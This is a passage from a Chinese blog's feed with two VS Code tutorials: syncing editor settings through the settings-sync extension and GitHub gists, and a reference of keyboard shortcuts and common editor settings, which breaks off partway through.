    <content type="html"><![CDATA[<h1 id="VS-Code-配置云同步"><a href="#VS-Code-配置云同步" class="headerlink" title="VS Code 配置云同步"></a>VS Code 配置云同步</h1><p>我们可以将配置云同步，这样的话，当我们换个电脑时，即可将配置一键同步到本地，就不需要重新安装插件了，也不需要重新配置软件。</p><p>我们还可以把配置分享其他用户，也可以把其他用户的配置给自己用。</p><p><strong>将自己本地的配置云同步到 GitHub</strong>：</p><p>（1）安装插件 <code>settings-sync</code>。</p><p>（2）安装完插件后，在插件里使用 GitHub 账号登录。</p><p>（3）登录后在 vscode 的界面中，可以选择一个别人的 gist；也可以忽略掉，然后创建一个属于自己的 gist。</p><p>（4）使用快捷键 「Command + Shift + P」，在弹出的命令框中输入 sync，并选择「更新/上传配置」，这样就可以把最新的配置上传到 GitHub。</p><p><strong>换另外一个电脑时，从云端同步配置到本地</strong>：</p><p>（1）当我们换另外一台电脑时，可以先在 VS Code 中安装 <code>settings-sync</code> 插件。</p><p>（2）安装完插件后，在插件里使用 GitHub 账号登录。</p><p>（3）登录之后，插件的界面上，会自动出现之前的同步记录：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200521_1530.png"></p><p>上图中，我们点击最新的那条记录，就可将云端的最新配置同步到本地：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200521_1550.png"></p><p>如果你远程的配置没有成功同步到本地，那可能是网络的问题，此时，可以使用快捷键 「Command + Shift + P」，在弹出的命令框中输入 sync，并选择「下载配置」，多试几次。</p><p><strong>使用其他人的配置</strong>：</p><p>如果我们想使用别人的配置，首先需要对方提供给你 gist。具体步骤如下：</p><p>（1）安装插件 <code>settings-sync</code>。</p><p>（2）使用快捷键 「Command + Shift + P」，在弹出的命令框中输入 sync，并选择「下载配置」</p><p>（3）在弹出的界面中，选择「Download Public Gist」，然后输入别人分享给你的 gist。注意，这一步不需要登录 GitHub 账号。</p><h1 id="更为详细的教程"><a href="#更为详细的教程" class="headerlink" title="更为详细的教程"></a>更为详细的教程</h1><ul><li><a href="https://blog.csdn.net/kan2016/article/details/106527374">vs code设置同步–settings sync</a></li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://github.com/qianguyihao/Web">https://github.com/qianguyihao/Web</a></li><li><a href="https://blog.csdn.net/kan2016/article/details/106527374">vs code设置同步–settings sync</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VS-Code-配置云同步&quot;&gt;&lt;a href=&quot;#VS-Code-配置云同步&quot; class=&quot;headerlink&quot; title=&quot;VS Code 配置云同步&quot;&gt;&lt;/a&gt;VS Code 配置云同步&lt;/h1&gt;&lt;p&gt;我们可以将配置云同步，这样的话，当我们换个电脑时，即</summary>
      
    
    
    
    <category term="环境搭建" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    <category term="vscode" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/vscode/"/>
    
    
    <category term="vscode" scheme="https://greydr34d.github.io/tags/vscode/"/>
    
  </entry>
  
  <entry>
    <title>Vs Code快捷键与常用配置</title>
    <link href="https://greydr34d.github.io/2021/01/07/Vs-Code%E5%BF%AB%E6%8D%B7%E9%94%AE%E4%B8%8E%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE/"/>
    <id>https://greydr34d.github.io/2021/01/07/Vs-Code%E5%BF%AB%E6%8D%B7%E9%94%AE%E4%B8%8E%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE/</id>
    <published>2021-01-07T03:20:27.000Z</published>
    <updated>2021-01-10T12:11:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VS-Code-快捷键与常用配置"><a href="#VS-Code-快捷键与常用配置" class="headerlink" title="VS Code 快捷键与常用配置"></a>VS Code 快捷键与常用配置</h1><p>前言：本文主要内容转载于<a href="https://github.com/qianguyihao/Web%EF%BC%8C%E6%84%9F%E8%B0%A2%E5%8D%83%E5%8F%A4%E5%A3%B9%E5%8F%B7%E7%9A%84%E5%88%86%E4%BA%AB%EF%BC%8C%E7%84%B6%E6%88%91%E8%83%BD%E5%A4%9F%E9%9D%9E%E5%B8%B8%E9%A1%BA%E5%88%A9%E7%9A%84%E5%85%A5%E5%9D%91vscode%E3%80%82">https://github.com/qianguyihao/Web，感谢千古壹号的分享，然我能够非常顺利的入坑vscode。</a></p><h2 id="一、VS-Code-的介绍"><a href="#一、VS-Code-的介绍" class="headerlink" title="一、VS Code 的介绍"></a>一、VS Code 的介绍</h2><blockquote><p>VS Code 的全称是 Visual Studio Code，是一款开源的、免费的、跨平台的、高性能的、轻量级的代码编辑器。它在性能、语言支持、开源社区方面，都做得很不错。</p></blockquote><h3 id="VS-Code-的安装"><a href="#VS-Code-的安装" class="headerlink" title="VS Code 的安装"></a>VS Code 的安装</h3><ul><li>VS Code 官网：<a href="https://code.visualstudio.com/">https://code.visualstudio.com</a></li></ul><p>VS Code 的安装很简单，直接去官网下载安装包，然后双击安装即可。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190313_1750_3.png"></p><p>上图中，直接点击 download，一键下载安装即可。</p><p>linux deb包</p><div class="hljs code-wrapper"><pre><code class="hljs bash">dpkg -i ***.deb</code></pre></div><p>2020.4版本的kali可以直接使用apt对deb包进行安装，<a href="https://thedarkbay797951995.wordpress.com/2020/08/15/install-vs-code-in-kali-linux/">具体参考</a></p><div class="hljs code-wrapper"><pre><code class="hljs bash">root@kali:~/Downloads<span class="hljs-comment"># sudo apt install ./code_1.48.0-1597304990_amd64.deb </span></code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/screenshot-2020-08-15-at-3.19.41-pm.png" alt="img"></p><h2 id="二、VS-Code-快捷键"><a href="#二、VS-Code-快捷键" class="headerlink" title="二、VS Code 快捷键"></a>二、VS Code 快捷键</h2><blockquote><p>VS Code 用得熟不熟，首先就看你是否会用快捷键。以下列出的内容，都是常用快捷键，而加粗部分的快捷键，使用频率则非常高。任何工具，掌握 20%的技能，足矣应对 80% 的工作。</p></blockquote><h3 id="1、工作区快捷键"><a href="#1、工作区快捷键" class="headerlink" title="1、工作区快捷键"></a>1、工作区快捷键</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left"><strong>Cmd + Shift + P</strong></td><td align="left"><strong>Ctrl + Shift + P</strong>，F1</td><td align="left">显示命令面板</td><td align="left"></td></tr><tr><td align="left"><strong>Cmd + B</strong></td><td align="left"><strong>Ctrl + B</strong></td><td align="left">显示/隐藏侧边栏</td><td align="left">很实用</td></tr><tr><td align="left"><code>Cmd + \</code></td><td align="left"><code>Ctrl + \</code></td><td align="left"><strong>创建多个编辑器</strong></td><td align="left">【重要】抄代码利器</td></tr><tr><td align="left"><strong>Cmd + 1、2</strong></td><td align="left"><strong>Ctrl + 1、2</strong></td><td align="left">聚焦到第 1、第 2 个编辑器</td><td align="left">同上重要</td></tr><tr><td align="left"><strong>cmd +/-</strong></td><td align="left"><strong>ctrl +/-</strong></td><td align="left">将工作区放大/缩小（包括代码字体、左侧导航栏）</td><td align="left">在投影仪场景经常用到</td></tr><tr><td align="left">Cmd + J</td><td align="left">Ctrl + J</td><td align="left">显示/隐藏控制台</td><td align="left"></td></tr><tr><td align="left"><strong>Cmd + Shift + N</strong></td><td align="left"><strong>Ctrl + Shift + N</strong></td><td align="left">重新开一个软件的窗口</td><td align="left">很常用</td></tr><tr><td align="left">Cmd + Shift + W</td><td align="left">Ctrl + Shift + W</td><td align="left">关闭软件的当前窗口</td><td align="left"></td></tr><tr><td align="left">Cmd + N</td><td align="left">Ctrl + N</td><td align="left">新建文件</td><td align="left"></td></tr><tr><td align="left">Cmd + W</td><td align="left">Ctrl + W</td><td align="left">关闭当前文件</td><td align="left"></td></tr></tbody></table><h3 id="2、跳转操作"><a href="#2、跳转操作" class="headerlink" title="2、跳转操作"></a>2、跳转操作</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">Cmd + `</td><td align="left">没有</td><td align="left">在同一个软件的<strong>多个工作区</strong>之间切换</td><td align="left">使用很频繁</td></tr><tr><td align="left"><strong>Cmd + Option + 左右方向键</strong></td><td align="left">Ctrl + Pagedown/Pageup</td><td align="left">在已经打开的<strong>多个文件</strong>之间进行切换</td><td align="left">非常实用</td></tr><tr><td align="left">Ctrl + Tab</td><td align="left">Ctrl + Tab</td><td align="left">在已经打开的多个文件之间进行跳转</td><td align="left">不如上面的快捷键快</td></tr><tr><td align="left">Cmd + Shift + O</td><td align="left">Ctrl + shift + O</td><td align="left">在当前文件的各种<strong>方法之间</strong>进行跳转</td><td align="left"></td></tr><tr><td align="left">Ctrl + G</td><td align="left">Ctrl + G</td><td align="left">跳转到指定行</td><td align="left"></td></tr><tr><td align="left"><code>Cmd+Shift+\</code></td><td align="left"><code>Ctrl+Shift+\</code></td><td align="left">跳转到匹配的括号</td><td align="left"></td></tr></tbody></table><h3 id="3、移动光标"><a href="#3、移动光标" class="headerlink" title="3、移动光标"></a>3、移动光标</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">方向键</td><td align="left">方向键</td><td align="left">在<strong>单个字符</strong>之间移动光标</td><td align="left">大家都知道</td></tr><tr><td align="left"><strong>option + 左右方向键</strong></td><td align="left"><strong>Ctrl + 左右方向键</strong></td><td align="left">在<strong>单词</strong>之间移动光标</td><td align="left">很常用</td></tr><tr><td align="left"><strong>Cmd + 左右方向键</strong></td><td align="left"><strong>Fn + 左右方向键</strong></td><td align="left">在<strong>整行</strong>之间移动光标</td><td align="left">很常用</td></tr><tr><td align="left">Cmd + ←</td><td align="left">Fn + ←（或 Win + ←）</td><td align="left">将光标定位到当前行的最左侧</td><td align="left">很常用</td></tr><tr><td align="left">Cmd + →</td><td align="left">Fn + →（或 Win + →）</td><td align="left">将光标定位到当前行的最右侧</td><td align="left">很常用</td></tr><tr><td align="left">Cmd + ↑</td><td align="left">Ctrl + Home</td><td align="left">将光标定位到文章的第一行</td><td align="left"></td></tr><tr><td align="left">Cmd + ↓</td><td align="left">Ctrl + End</td><td align="left">将光标定位到文章的最后一行</td><td align="left"></td></tr><tr><td align="left">Cmd + Shift + \</td><td align="left"></td><td align="left">在<strong>代码块</strong>之间移动光标</td><td align="left"></td></tr></tbody></table><h3 id="4、编辑操作"><a href="#4、编辑操作" class="headerlink" title="4、编辑操作"></a>4、编辑操作</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left"><strong>Cmd + Enter</strong></td><td align="left"><strong>Ctrl + Enter</strong></td><td align="left">在当前行的下方新增一行，然后跳至该行</td><td align="left">即使光标不在行尾，也能快速向下插入一行</td></tr><tr><td align="left">Cmd+Shift+Enter</td><td align="left">Ctrl+Shift+Enter</td><td align="left">在当前行的上方新增一行，然后跳至该行</td><td align="left">即使光标不在行尾，也能快速向上插入一行</td></tr><tr><td align="left"><strong>Option + ↑</strong></td><td align="left"><strong>Alt + ↑</strong></td><td align="left">将代码向上移动</td><td align="left">很常用</td></tr><tr><td align="left"><strong>Option + ↓</strong></td><td align="left"><strong>Alt + ↓</strong></td><td align="left">将代码向下移动</td><td align="left">很常用</td></tr><tr><td align="left">Option + Shift + ↑</td><td align="left">Alt + Shift + ↑</td><td align="left">将代码向上复制</td><td align="left"></td></tr><tr><td align="left"><strong>Option + Shift + ↓</strong></td><td align="left"><strong>Alt + Shift + ↓</strong></td><td align="left">将代码向下复制</td><td align="left">写重复代码的利器</td></tr></tbody></table><h3 id="5、多光标编辑"><a href="#5、多光标编辑" class="headerlink" title="5、多光标编辑"></a>5、多光标编辑</h3><table><thead><tr><th>Mac 快捷键</th><th>Win 快捷键</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td><strong>Cmd + Option + 上下键</strong></td><td><strong>Ctrl + Alt + 上下键</strong></td><td>在连续的多列上，同时出现光标</td><td></td></tr><tr><td><strong>Option + 鼠标点击任意位置</strong></td><td><strong>Alt + 鼠标点击任意位置</strong></td><td>在任意位置，同时出现光标</td><td></td></tr><tr><td>Option + Shift + 鼠标拖动</td><td>Alt + Shift + 鼠标拖动</td><td>在选中区域的每一行末尾，出现光标</td><td></td></tr><tr><td>Cmd + Shift + L</td><td>Ctrl + Shift + L</td><td>在选中文本的所有相同内容处，出现光标</td><td></td></tr></tbody></table><p>其他的多光标编辑操作：（很重要）</p><ul><li><p>选中某个文本，然后反复按住快捷键「 <strong>Cmd + D</strong> 」键（windows 用户是按住「<strong>Ctrl + D</strong>」键）， 即可将全文中相同的词逐一加入选择。</p></li><li><p>选中一堆文本后，按住「<strong>Option + Shift + i</strong>」键（windows 用户是按住「<strong>Alt + Shift + I</strong>」键），既可在<strong>每一行的末尾</strong>都创建一个光标。</p></li></ul><h3 id="6、删除操作"><a href="#6、删除操作" class="headerlink" title="6、删除操作"></a>6、删除操作</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">Cmd + shift + K</td><td align="left">Ctrl + Shift + K</td><td align="left">删除整行</td><td align="left">「Cmd + X」的作用是剪切，但也可以删除整行</td></tr><tr><td align="left"><strong>option + Backspace</strong></td><td align="left"><strong>Ctrl + Backspace</strong></td><td align="left">删除光标之前的一个单词</td><td align="left">英文有效，很常用</td></tr><tr><td align="left">option + delete</td><td align="left">Ctrl + delete</td><td align="left">删除光标之后的一个单词</td><td align="left"></td></tr><tr><td align="left"><strong>Cmd + Backspace</strong></td><td align="left"></td><td align="left">删除光标之前的整行内容</td><td align="left">很常用</td></tr><tr><td align="left">Cmd + delete</td><td align="left"></td><td align="left">删除光标之后的整行内容</td><td align="left"></td></tr></tbody></table><p>备注：上面所讲到的移动光标、编辑操作、删除操作的快捷键，在其他编辑器里，大部分都适用。</p><h3 id="7、编程语言相关"><a href="#7、编程语言相关" class="headerlink" title="7、编程语言相关"></a>7、编程语言相关</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">Cmd + /</td><td align="left">Ctrl + /</td><td align="left">添加单行注释</td><td align="left">很常用</td></tr><tr><td align="left"><strong>Option + Shift + F</strong></td><td align="left">Alt + shift + F</td><td align="left">代码格式化</td><td align="left">很常用</td></tr><tr><td align="left">F2</td><td align="left">F2</td><td align="left">以重构的方式进行<strong>重命名</strong></td><td align="left">改代码备</td></tr><tr><td align="left">Ctrl + J</td><td align="left"></td><td align="left">将多行代码合并为一行</td><td align="left">Win 用户可在命令面板搜索”合并行“</td></tr><tr><td align="left">Cmd +</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">Cmd + U</td><td align="left">Ctrl + U</td><td align="left">将光标的移动回退到上一个位置</td><td align="left">撤销光标的移动和选择</td></tr></tbody></table><h3 id="8、搜索相关"><a href="#8、搜索相关" class="headerlink" title="8、搜索相关"></a>8、搜索相关</h3><table><thead><tr><th align="left">Mac 快捷键</th><th align="left">Win 快捷键</th><th align="left">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left"><strong>Cmd + Shift + F</strong></td><td align="left"><strong>Ctrl + Shift +F</strong></td><td align="left">全局搜索代码</td><td align="left">很常用</td></tr><tr><td align="left"><strong>Cmd + P</strong></td><td align="left"><strong>Ctrl + P</strong></td><td align="left">在当前的项目工程里，<strong>全局</strong>搜索文件名</td><td align="left"></td></tr><tr><td align="left">Cmd + F</td><td align="left">Ctrl + F</td><td align="left">在当前文件中搜索代码，光标在搜索框里</td><td align="left"></td></tr><tr><td align="left"><strong>Cmd + G</strong></td><td align="left"><strong>F3</strong></td><td align="left">在当前文件中搜索代码，光标仍停留在编辑器里</td><td align="left">很巧妙</td></tr></tbody></table><h3 id="9、自定义快捷键"><a href="#9、自定义快捷键" class="headerlink" title="9、自定义快捷键"></a>9、自定义快捷键</h3><p>按住快捷键「Cmd + Shift + P」，弹出命令面板，在命令面板中输入“快捷键”，可以进入快捷键的设置。</p><p>当然，你也可以选择菜单栏「偏好设置 –&gt; 键盘快捷方式」，进入快捷键的设置：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190329_2120.png"></p><h3 id="10、快捷键列表"><a href="#10、快捷键列表" class="headerlink" title="10、快捷键列表"></a>10、快捷键列表</h3><p>你可以点击 VS Code 左下角的齿轮按钮，效果如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190418_1738.png"></p><p>上图中，在展开的菜单中选择「键盘快捷方式」，就可以查看和修改所有的快捷键列表了：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190418_1739_2.png"></p><h3 id="快捷键参考链接"><a href="#快捷键参考链接" class="headerlink" title="快捷键参考链接"></a>快捷键参考链接</h3><ul><li>快捷键速查表[官方]：<a href="https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf">https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf</a></li></ul><h2 id="三、VS-Code-常见配置"><a href="#三、VS-Code-常见配置" class="headerlink" title="三、VS Code 常见配置"></a>三、VS Code 常见配置</h2><h3 id="1、VS-Code-设置为中文语言"><a href="#1、VS-Code-设置为中文语言" class="headerlink" title="1、VS Code 设置为中文语言"></a>1、VS Code 设置为中文语言</h3><p>直接安装插件<code>Chinese (Simplified) Language Pack for Visual Studio Code</code></p><h3 id="2、Breadcrumb"><a href="#2、Breadcrumb" class="headerlink" title="2、Breadcrumb"></a>2、Breadcrumb</h3><p>Breadcrumb可以使得我们打开当前文件时能够看到层级结构</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190415_2009.png"></p><p><strong>设置步骤：</strong></p><p>打开 VS Code 的设置项，选择「用户设置 -&gt; 工作台 -&gt; 导航路径」，如下图所示：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20191108_1550.png"></p><p>上图中，将红框部分打钩即可。</p><h3 id="3、左右显示多个编辑器窗口"><a href="#3、左右显示多个编辑器窗口" class="headerlink" title="3、左右显示多个编辑器窗口"></a>3、左右显示多个编辑器窗口</h3><p>Mac 用户按住快捷键 <code>Cmd + \</code>， Windows 用户按住快捷键<code>Ctrl + \</code>，即可同时打开多个编辑器窗口，效果如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200619_0030.gif"></p><p>按快捷键「Cmd + 1 」切换到左边的窗口，按快捷键「Cmd + 2 」切换到右边的窗口。随时随地，想切就切。</p><p>在使用的时候可以直接按快捷键「Cmd + 2」，直接就会分出第二个窗口</p><h3 id="4、是否显示代码的行号"><a href="#4、是否显示代码的行号" class="headerlink" title="4、是否显示代码的行号"></a>4、是否显示代码的行号</h3><p>VS Code 默认显示代码的行号。你可以在设置项里搜索 <code>editor.lineNumbers</code>修改设置，配置项如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190417_2140.png"></p><p>我建议保留这个设置项，无需修改。</p><h3 id="5、右侧是否显示代码的缩略图"><a href="#5、右侧是否显示代码的缩略图" class="headerlink" title="5、右侧是否显示代码的缩略图"></a>5、右侧是否显示代码的缩略图</h3><p>VS Code 会在代码的右侧，默认显示缩略图。你可以在设置项里搜索 <code>editor.minimap</code>进行设置，配置项如下：</p><p><img src="http://img.smyhvae.com/20190417_2156.png"></p><h3 id="6、将当前行代码高亮显示（更改光标所在行的背景色）"><a href="#6、将当前行代码高亮显示（更改光标所在行的背景色）" class="headerlink" title="6、将当前行代码高亮显示（更改光标所在行的背景色）"></a>6、将当前行代码高亮显示（更改光标所在行的背景色）</h3><p>当我们把光标放在某一行时，这一行的背景色并没有发生变化。如果想<strong>高亮显示</strong>当前行的代码，需要设置两步：</p><p>（1）在设置项里搜索<code>editor.renderLineHighlight</code>，将选项值设置为<code>all</code>或者<code>line</code>。</p><p>（2）在设置项里增加如下内容：</p><div class="hljs code-wrapper"><pre><code class="hljs json">&quot;workbench.colorCustomizations&quot;: &#123;    &quot;editor.lineHighlightBackground&quot;: &quot;#00000090&quot;,    &quot;editor.lineHighlightBorder&quot;: &quot;#ffffff30&quot;&#125;</code></pre></div><p>上方代码，第一行代码的意思是：修改光标所在行的背景色（背景色设置为全黑，不透明度 90%）；第二行代码的意思是：修改光标所在行的边框色。</p><h3 id="7、改完代码后立即自动保存"><a href="#7、改完代码后立即自动保存" class="headerlink" title="7、改完代码后立即自动保存"></a>7、改完代码后立即自动保存</h3><p><strong>方式一</strong>：</p><p>改完代码后，默认不会自动保存。你可以在设置项里搜索<code>files.autoSave</code>，修改配置项如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190417_2216.png"></p><p>上图中，我们将配置项修改为<code>onFocusChange</code>之后，那么，当光标离开该文件后，这个文件就会自动保存了。<strong>非常方便</strong>。</p><p><strong>方式二</strong>：</p><p>当然，你也可以直接在菜单栏选择「文件-自动保存」。勾选后，当你写完代码后，文件会立即实时保存。</p><h3 id="8、保存代码后，是否立即格式化"><a href="#8、保存代码后，是否立即格式化" class="headerlink" title="8、保存代码后，是否立即格式化"></a>8、保存代码后，是否立即格式化</h3><p>保存代码后，默认<strong>不会立即</strong>进行代码的格式化。你可以在设置项里搜索<code>editor.formatOnSave</code>查看该配置项：</p><p><img src="http://img.smyhvae.com/20190417_2213.png"></p><p>我觉得这个配置项保持默认就好，不用打钩。</p><h3 id="9、空格-or-制表符"><a href="#9、空格-or-制表符" class="headerlink" title="9、空格 or 制表符"></a>9、空格 or 制表符</h3><p>VS Code 会根据你所打开的文件来决定该使用空格还是制表。也就是说，如果你的项目中使用的都是制表符，那么，当你在写新的代码时，按下 tab 键后，编辑器就会识别成制表符。</p><p>常见的设置项如下：</p><ul><li><strong>editor.detectIndentation</strong>：自动检测（默认开启）。截图如下：</li></ul><p><img src="http://img.smyhvae.com/20190417_2205.png"></p><ul><li><strong>editor.insertSpaces</strong>：按 Tab 键时插入空格（默认）。截图如下：</li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190417_2207.png"></p><ul><li><strong>editor.tabSize</strong>：一个制表符默认等于四个空格。截图如下：</li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190417_2209.png"></p><h3 id="10、新建文件后的默认文件类型"><a href="#10、新建文件后的默认文件类型" class="headerlink" title="10、新建文件后的默认文件类型"></a>10、新建文件后的默认文件类型</h3><p>当我们按下快捷键「Cmd + N」新建文件时，VS Code 默认无法识别这个文件到底是什么类型的，因此也就无法识别相应的语法高亮。</p><p>如果你想修改默认的文件类型，可以在设置项里搜索<code>files.defaultLanguage</code>，设置项如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190417_2221.png"></p><p>上图中的红框部分，填入你期望的默认文件类型。我填的是<code>html</code>类型，你也可以填写成 <code>javascript</code> 或者 <code>markdown</code>，或者其他的语言类型。</p><h3 id="11、删除文件时，是否弹出确认框"><a href="#11、删除文件时，是否弹出确认框" class="headerlink" title="11、删除文件时，是否弹出确认框"></a>11、删除文件时，是否弹出确认框</h3><p>当我们在 VS Code 中删除文件时，默认会弹出确认框。如果你想修改设置，可以在设置项里搜索<code>xplorer.confirmDelete</code>。截图如下：</p><p><img src="http://img.smyhvae.com/20190418_1758.png"></p><p>我建议这个设置项保持默认的打钩就好，不用修改。删除文件前的弹窗提示，也是为了安全考虑，万一手贱不小心删了呢？</p><blockquote><p>接下来，我们来讲一些更高级的配置。</p></blockquote><h3 id="12、文件对比"><a href="#12、文件对比" class="headerlink" title="12、文件对比"></a>12、文件对比</h3><p>VS Code 默认支持<strong>对比两个文件的内容</strong>。选中两个文件，然后右键选择「将已选项进行比较」即可，效果如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190329_1756.png"></p><p>VS Code 自带的对比功能并不够强大，我们可以安装插件<code>compareit</code>，进行更丰富的对比。比如说，安装完插件<code>compareit</code>之后，我们可以将「当前文件」与「剪切板」里的内容进行对比：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190329_1757.png"></p><h3 id="13、查找某个函数在哪些地方被调用了"><a href="#13、查找某个函数在哪些地方被调用了" class="headerlink" title="13、查找某个函数在哪些地方被调用了"></a>13、查找某个函数在哪些地方被调用了</h3><p>比如我已经在<code>a.js</code>文件里调用了 <code>foo()</code>函数。那么，如果我想知道<code>foo()</code>函数在其他文件中是否也被调用了，该怎么做呢？</p><p>做法如下：在 <code>a.js</code> 文件里，选中<code>foo()</code>函数（或者将光标放置在<code>foo()</code>函数上），然后按住快捷键「Shift + F12」，就能看到 <code>foo()</code>函数在哪些地方被调用了，比较实用。</p><h3 id="14、鼠标操作"><a href="#14、鼠标操作" class="headerlink" title="14、鼠标操作"></a>14、鼠标操作</h3><ul><li><p>在当前行的位置，鼠标三击，可以选中当前行。</p></li><li><p>用鼠标单击文件的<strong>行号</strong>，可以选中当前行。</p></li><li><p>在某个<strong>行号</strong>的位置，<strong>上下移动鼠标，可以选中多行</strong>。</p></li></ul><h3 id="15、重构"><a href="#15、重构" class="headerlink" title="15、重构"></a>15、重构</h3><p>重构分很多种，我们来举几个例子。</p><p><strong>命名重构</strong>：</p><p>当我们尝试去修改某个函数（或者变量名）时，我们可以把光标放在上面，然后按下「F2」键，那么，这个函数（或者变量名）出现的地方都会被修改。</p><p><strong>方法重构</strong>：</p><p>选中某一段代码，这个时候，代码的左侧会出现一个「灯泡图标」，点击这个图标，就可以把这段代码提取为一个单独的函数。</p><h3 id="16、在当前文件中搜索"><a href="#16、在当前文件中搜索" class="headerlink" title="16、在当前文件中搜索"></a>16、在当前文件中搜索</h3><p>在上面的快捷键列表中，我们已经知道如下快捷键：</p><ul><li><p>Cmd + F（Win 用户是 Ctrl + F）：在当前文件中搜索，光标在搜索框里</p></li><li><p>Cmd + G（Win 用户是 F3）：在当前文件中搜索，光标仍停留在编辑器里</p></li></ul><p>另外，你可能会注意到，搜索框里有很多按钮，每个按钮都对应着不同的功能，如下图所示：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190415_2052.png"></p><p>上图中，你可以通过「Tab」键和「Shift + Tab」键在输入框和替换框之间进行切换。</p><p>「在选定内容中查找」这个功能还是比较实用的。你也可以在设置项里搜索 <code>editor.find.autoFindInSelection</code>，勾选该设置项后，那么，当你选中指定内容后，然后按住「Cmd + F」，就可以<strong>自动</strong>只在这些内容里进行查找。该设置项如下图所示：</p><p><img src="http://img.smyhvae.com/20191108_1655.png"></p><h3 id="17、全局搜索"><a href="#17、全局搜索" class="headerlink" title="17、全局搜索"></a>17、全局搜索</h3><p>在上面的快捷键列表中，我们已经知道如下快捷键：</p><ul><li>Cmd + Shift + F（Win 用户是 Ctrl + Shift +F）：在全局的文件夹中进行搜索。效果如下：</li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190415_2107.png"></p><p>上图中，你可以点击红框部分，展开更多的配置项。</p><h3 id="18、Git-版本管理"><a href="#18、Git-版本管理" class="headerlink" title="18、Git 版本管理"></a>18、Git 版本管理</h3><p>VS Code 自带了 Git 版本管理，如下图所示：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190418_1850.png"></p><p>上图中，我们可以在这里进行常见的 git 命令操作。如果你还不熟悉 <strong>Git 版本管理</strong>，可以先去补补课。</p><p>与此同时，我建议安装插件<code>GitLens</code>，它是 VS Code 中我最推荐的一个插件，简直是 Git 神器，码农必备。</p><h3 id="19、将工作区放大-缩小"><a href="#19、将工作区放大-缩小" class="headerlink" title="19、将工作区放大/缩小"></a>19、将工作区放大/缩小</h3><p>我们在上面的设置项里修改字体大小后，仅仅只是修改了代码的字体大小。</p><p>如果你想要缩放整个工作区（包括代码的字体、左侧导航栏的字体等），可以按下快捷键「**cmd +/-**」。windows 用户是按下「ctrl +/-」</p><p><strong>当我们在投影仪上给别人演示代码的时候，这一招十分管用</strong>。</p><p>如果你想恢复默认的工作区大小，可以在命令面板输入<code>重置缩放</code>（英文是<code>reset zoom</code>）</p><h3 id="20、创建多层子文件夹"><a href="#20、创建多层子文件夹" class="headerlink" title="20、创建多层子文件夹"></a>20、创建多层子文件夹</h3><p>我们可以在新建文件夹的时候，如果直接输入<code>aa/bb/cc</code>，比如：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190418_2022.png"></p><p>那么，就可以创建多层子文件夹，效果如下：</p><p><img src="http://img.smyhvae.com/20190418_2023.png"></p><h3 id="21、-vscode-文件夹的作用"><a href="#21、-vscode-文件夹的作用" class="headerlink" title="21、.vscode 文件夹的作用"></a>21、<code>.vscode</code> 文件夹的作用</h3><p>为了统一团队的 vscode 配置，我们可以在项目的根目录下建立<code>.vscode</code>目录，在里面放置一些配置内容，比如：</p><ul><li><p><code>settings.json</code>：工作空间设置、代码格式化配置、插件配置。</p></li><li><p><code>sftp.json</code>：ftp 文件传输的配置。</p></li></ul><p><code>.vscode</code>目录里的配置只针对当前项目范围内生效。将<code>.vscode</code>提交到代码仓库，大家统一配置时，会非常方便。</p><h3 id="22、自带终端"><a href="#22、自带终端" class="headerlink" 